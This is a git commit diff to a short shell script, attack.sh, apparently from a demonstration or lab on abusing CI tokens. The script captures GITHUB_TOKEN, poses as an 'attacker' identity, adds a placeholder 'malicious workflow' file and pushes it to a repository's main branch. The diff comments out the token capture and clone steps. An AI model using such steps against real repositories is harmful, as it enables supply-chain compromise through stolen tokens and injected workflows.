0289e436d3bc3f6e60d51bebbee67f4fbf4ff4d1
analystoscar1 <164302924+analystoscar1@users.noreply.github.com>
2025-11-02 15:08:55 +0530

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -1,11 +1,11 @@
 # Extract the repo token
-TOKEN=$GITHUB_TOKEN
+#TOKEN=$GITHUB_TOKEN
 # Modify workflow to run their code on main
 git config --global user.email "attacker@example.com"
 git config --global user.name "attacker"
-git clone https://github.com/shreyapohekar/my-dranet.git
-cd my-dranet
+#git clone https://github.com/shreyapohekar/my-dranet.git
+#cd my-dranet
 echo 'malicious code' > .github/workflows/pwn.yml
 git add .github/workflows/pwn.yml
 git commit -m "Add malicious workflow"
-git push https://$TOKEN@github.com/shreyapohekar/my-dranet.git main
+git push origin main
